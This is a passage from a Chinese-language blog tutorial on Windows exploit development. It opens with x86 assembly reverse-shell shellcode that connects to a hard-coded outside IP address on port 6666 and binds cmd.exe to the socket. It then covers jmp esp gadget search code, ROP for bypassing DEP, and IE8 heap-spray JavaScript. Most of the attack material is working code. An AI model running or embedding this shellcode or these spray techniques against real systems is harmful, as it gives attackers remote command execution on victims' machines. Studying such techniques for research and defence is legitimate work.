        mov cx,0x4174;
        push ecx ;tA
        push 0x656B636F ;ocke
        push 0x53415357 ;WSAS
        push esp                       ;"WSASocket"
        push ebx;ws2_32.dll
        call edx;GetProcAddress("WSASocket")

        add esp,0xc 
        push eax;WSASocket

        mov edx,[esp+0x18] ;GetProcAddress
        mov ebx,[esp+8];ws2_32.dll
        xor ecx,ecx
        push 0x746365 ;ect
        push 0x6E6E6F63 ;conn
        push esp                       ;"connect"
        push ebx;ws2_32.dll
        call edx;GetProcAddress("connect")

        ;inet_addr
        add esp,0x8 
        push eax;connect
        mov edx,[esp+0x1c] ;GetProcAddress
        mov ebx,[esp+0xc];ws2_32.dll
        xor ecx,ecx
        mov cx,0x72;
        push ecx;r
        push 0x6464615F;_add
        push 0x74656E69;inet
        push esp                       ;"inet_addr"
        push ebx;ws2_32.dll
        call edx;GetProcAddress("inet_addr")

        ;htons
        add esp,0xc
        push eax;
        mov edx,[esp+0x20] ;GetProcAddress
        mov ebx,[esp+0x10];ws2_32.dll
        xor ecx,ecx
        mov cx,0x73
        push ecx;s
        push 0x6E6F7468;hton
        push esp                       ;"htons"
        push ebx;ws2_32.dll
        call edx;GetProcAddress("htons")

        add esp,0x8
        push eax

        ;htons <--esp
        ;inet_addr <--esp+4
        ;connect <--esp+8
        ;WSASocket <--esp+0xc
        ;WSAStartup <--esp+0x10
        ;ws2_32.dll <--esp+0x14
        ;LoadLibraryA <--esp+0x18
        ;GetStartupInfoA <--esp+1c
        ;CreateProcessA <--esp+0x20
        ;GetProcAddr <-- esp+0x24
        ;Kernel32 <--esp+0x28

编写Socket部分
到这里，我们的程序已经能和服务器建立TCP连接了
        /*Socket部分*/
        //WSTartup(0x202,&WSADATA,)
        sub esp,0x20
        mov eax,[esp+0x30]
        push esp;lpWSADATA
        push 0x202;wVersionRequested
        call eax //if eax->0 sucess.else fail


        //WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,0,0)
        mov eax,[esp+0x2c];WSASocket
        xor ecx,ecx
        push ecx
        push ecx
        push ecx
        mov cx,0x6
        push ecx
        mov cx,0x1
        push ecx
        inc ecx
        push ecx
        call eax

        push eax; //push socket


        //inet_addr(120.79.174.75)
        mov eax,[esp+0x28] ;inet_addr
        xor ecx,ecx
        mov cx,0x35
        push ecx;5
        push 0x372E3437;74.7
        push 0x312E3937;79.1
        push 0x2E303231;120.
        push esp;
        call eax;

        add esp,0x10
        push eax;push Remote_addr -->sa_data+2

        //htons(6666)
        mov eax,[esp+0x28] ;htons
        push 0x1A0A ;6666
        call eax

        mov edx,[esp+0x30];connect
        //Store sock_addr
        push ax;push Remote_ports -->sa_data
        mov ax,0x2
        push ax;push AF_INET -->sa_family

        mov ebx,esp; store sock_addr

        //Connect(socket,&sock_addr,sizeof(sock_addr));
        /*
        00000000 sockaddr        struc ; (sizeof=0x10, align=0x2, copyof_12)
        00000000                                         ; XREF: _wmain_0/r
        00000000 sa_family --> AF_INET(2)               ; XREF: _wmain_0+80/w
        00000002 sa_data  -->  htons(REMOTE_PROT)        ; XREF: _wmain_0+75/w
        00000004 sa_data+2 --> inet_addr(REMOTE_ADDR)     ; _wmain_0+9B/w
        00000010 sockaddr        ends
        */

        push 0x10 ; sizeof(sock_addr)
        push ebx ;scok_addr
        push [esp+0x10];socket

        call edx ;connect  ;    server#nc -l 6666 (close fire wall)


在本地创建cmd.exe子进程
注意这两个语句也需要实现，否则只能在本地打开一个shell
#define STARTF_USESTDHANDLES    0000100
即使用父进程的句柄（我们的Socket也是一个句柄）而不是全新的句柄。
//si.dwFlags=STARTF_USESHOWWINDOW|STARTF_USESTDHANDLES;
//si.wShowWindow=SW_HIDE;

        /*创建cmd.exe子进程*/

        /*
        00000000 _STARTUPINFOW   struc ; (sizeof=0x44, align=0x4, copyof_14)
        00000000                                         ; XREF: _wmain_0/r
        00000000 cb              ->size 44               ; XREF: _wmain_0+134/w
        00000004 lpReserved      dd ?                    ; offset
        00000008 lpDesktop       dd ?                    ; offset
        0000000C lpTitle         dd ?                    ; offset
        00000010 dwX             dd ?
        00000014 dwY             dd ?
        00000018 dwXSize         dd ?
        0000001C dwYSize         dd ?
        00000020 dwXCountChars   dd ?
        00000024 dwYCountChars   dd ?
        00000028 dwFillAttribute dd ?
        0000002C dwFlags         <--0x100
        00000030 wShowWindow     dw
        00000032 cbReserved2     dw ?
        00000034 lpReserved2     dd ?                    ; offset
        00000038 hStdInput       ->socket                ; XREF: _wmain_0+159/w ; offset
        0000003C hStdOutput      ->socket                 ; XREF: _wmain_0+14D/w
        00000040 hStdError       ->socket                 ; XREF: _wmain_0+141/w
        00000040                                         ; _wmain_0+147/r ; offset
        00000044 _STARTUPINFOW   ends
        00000044
*/
        //init _STARTUPINFO

        mov esi,[esp+0x8]
        push esi; push hStdError
        push esi; push hStdOutput
        push esi; push StdInput
        xor esi,esi
        xor ecx,ecx
        push esi;
        push esi;
        push 0x100; dwFlags
        mov cx,0xa

PUSH_NULL:    
        push esi
        loop PUSH_NULL

        mov ecx,0x44 ;cb
        push ecx
        mov edx,esp ;_STARTUPINFO

        mov ebx,[esp+0x90];CreateProcess

        push 0x657865;exe
        push 0x2E646D63;cmd.
        mov esi,esp ;"cmd.exe"
        //CreateProcess(NULL,cmdline,NULL,NULL,TRUE,NULL,NULL,NULL,&si,&pi)

        push edx;&pi
        push edx ;&si
        xor ecx,ecx
        push ecx;NULL
        push ecx;NULL
        push ecx;NULL
        inc ecx
        push ecx;TRUE
        sub ecx,0x1
        push ecx;NULL
        push ecx;NULL
        push esi;cmdline
        push ecx;NULL
        call ebx;CreateProcess

        push eax

```

在执行call之后，你的服务器会得到一个windows的反弹shell。生成Unicode码之后，继续用可怜的IE8来做实验。

[![](_v_images/20191226140422940_26991.png)](https://gitee.com/p0kerface/blog__management/raw/master/uploads/0.Win%E4%B8%8Bshellcode%E7%BC%96%E5%86%9921231.png)

## shellcode布置技术

我们知道在栈溢出中，可以将shellcode布置在栈空间的不同位置，同样在实际漏洞利用中，尤其在栈溢出已经落寞的今天，堆利用中，布置shellcode方法更是层出不穷，笔者也无法将所有的方案汇总全面，就仅对目前常见的几种布置技术做个总结。

### Jmp esp /ROP

在Windows中使用jmp esp(跳板技术)的频率远远高于linux（虽然这种技术在linux下也可用），比起将shellcode放在ret地址后面，将shellcode放在栈顶能有效减少空间。通过调用jmp esp将程序跳转到shellcode。

虽然在DEP和ASLR盛行的年代，这个技术也早已不再有用武之地。但除了对于研究历史漏洞帮助，该技术还是引入ROP这个概念的一个前置知识，在学习了ROP之后，你会忽然领悟的。

这次让我们放下windbg，自己动手编程实现寻找jmp esp

**编程实现寻找gadget**

[![](_v_images/20191226140421766_14932.png)](https://gitee.com/p0kerface/blog__management/raw/master/uploads/0.Win%E4%B8%8Bshellcode%E7%BC%96%E5%86%9921648.png)

以jmp esp为案例，寻找user32.dll中的所有jmp esp地址。

```
#include "stdafx.h"
#include<windows.h>

#define DLL_Name "user32.dll"
int _tmain(int argc, _TCHAR* argv[])
{
​    HINSTANCE handle=LoadLibraryA(DLL_Name);
​    if(!handle){
​        printf("load dll errorn");
​        exit(0);
​    }
​    printf("Load success...n");
​    BYTE *ptr=(BYTE*)handle;
​    BOOL flag=false;
​    for(int i=0;!flag;i++)
​    {
​        try{
​        if(ptr[i]==0xFF&&ptr[i+1]==0xE4) //JMP ESP的十六进制码=0xFFE4
​            printf("ttptr->jmp esp = 0x%xn",((int)ptr+i));
​        }
​        catch(...)
​        {
​            int address=(int)ptr+i;
​            printf("END OF 0x%xn",address);
​            flag=true;
​        }
​    }
​    return 0;
}

```

### 使用ROP绕过DEP

ROP技术是用于绕过栈不可执行（其实现在的堆也不可执行咯），什么是ROP技术。其实之前的jmp esp已经引出了ROP的基础理念，即使用程序自身text段的机器码执行。

ROP的全程面向返回语句的编程，一个个gadgets串联起来的链叫做ROP链。每个gadgets的格式大概为“ 指令 指令 ret”，通过ret命令将所有的gadgets串联起来。

如果说jmp esp是一个跳板就直指靶心，那么ROP就是经过好多跳板，分步骤完成自己的命令。

常见的绕过DEP的案例，就是通过ROP实现VirtualProtect来对shellcode所在内存修改属性（相当于关闭DEP），将其修改为可执行，再通过JMP R32来跳转执行Shellcode。

具体案例可以参考我之前写的对IE浏览器写的Exploit  
[https://www.anquanke.com/post/id/190590](https://www.anquanke.com/post/id/190590)

### HeapSpray

堆喷射是一种shellcode布置技术，常常借助javascript等脚本语言实现，所以常见于浏览器漏洞。

上古的堆喷射

在Windows XP SP3以前，Windows下大部分程序都不会默认开始DEP（或者不支持），只需要构建nop（大量）+shellcode的内存块,使用javascript申请200MB的内存空间，能够覆盖内存的大量空间。只要控制程序流跳转到类似c0c0c0c（也可以是其他位置，只要足够稳定就行）这样就会顺着nops一路滑到shellcode并且执行。

参考代码

```
<script language="javascript">
shellcode="u1234u1234u1234u1234u1234u1234u1234u1234u1234u1234u1234u1234";
var nop="u9090u9090";
while(nop.length<=0x100000/2)
{
​    nop+=nop;
}

nop=nop.substring(0,0x100000/2-32/2-4/2-shellcode.length-2/2);
//nop=nop.substring(0,0x100000-32/2-4/2-2/2);
var slide=new Array();
for(var i=0;i<200;i++){
​    slide[i]=nop+shellcode;
//    slide[i]=nop;
}
</script>

```

精确堆喷射

在Windows进入后DEP时代，面临DEP和ASLR的双重防线，DEP导致堆中的数据无法执行，之前布置大量数据以量取胜的战术失去了意义。于是heap-feng-shui（堆风水）技术被提出。

通过堆风水，我们申请0x1000个0x80000大小的堆块。分配量足够大，导致堆块中的每0x1000个小的片的开始地址都是固定，通常为0xYYYY020。

因此我们能够将ROP链的头部稳定对齐末尾固定的四字节（例如0xYYYY0050）。这样就能构成某种意义上的精确喷射。

参考文献：[http://www.phreedom.org/research/heap-feng-shui/heap-feng-shui.html](http://www.phreedom.org/research/heap-feng-shui/heap-feng-shui.html)

IE8下的参考代码（shellcode喷射对齐c0c0c0c）

```
<!DOCTYPE html>
<html>
<head>
​    <title></title>
</head>
<body>
<script type="text/javascript">
​    var sc="u4141u4141u4141u4141u4141u4141u4141u4141u4141u4141u4141u4141u4141u4141";
​    var nop="u0c0cu0c0c";
​    var offset=0x5ee-4/2;//0xbdc/2-4/2
​    //以0x10000为单位的shellcode+nop结构单元

​    while(nop.length<0x10000)
​        nop+=nop;
​    var nop_chunk=nop.substring(0,(0x10000/2-sc.length)); //Unicode编码，所以0x10000/2个字节
​    var sc_nop=sc+nop_chunk;
​    //组合成单个大小为0x80000的堆块（heap-feng-shui)
​    while(sc_nop.length<0x100000)
​        sc_nop+=sc_nop;
​    sc_nop=sc_nop.substring(0,(0x80000-6)/2-offset);//组合成0x800000的堆块
​    var offset_pattern=nop.substring(0,offset); 
​    code=offset_pattern+sc_nop;
​    heap_chunks=new Array();
​    for(i=0;i<1000;i++)
​    {
​        heap_chunks[i]=code.substring(0,code.length);
​    }
</script>
</body>
</html>

```

参考文献：

\[1\]peter.《Exploit编写教程》\[OL/DB\],2010

\[2\]《现代化windows漏洞程序开发》\[OL/DB\],2016

\[3\]Failwest.《0day安全》\[M\].电子工业出版社,2011

\[4\][PEB手工分析](https://blog.csdn.net/hgy413/article/details/8490918)

\[5\][WinXp符号表不支持解决方案](https://blog.csdn.net/qq_38924942/article/details/87801649)

\[6\][https://blog.csdn.net/x_nirvana/article/details/68921334](https://blog.csdn.net/x_nirvana/article/details/68921334)

\[7\][https://blog.csdn.net/hgy413/article/details/7422722](https://blog.csdn.net/hgy413/article/details/7422722)
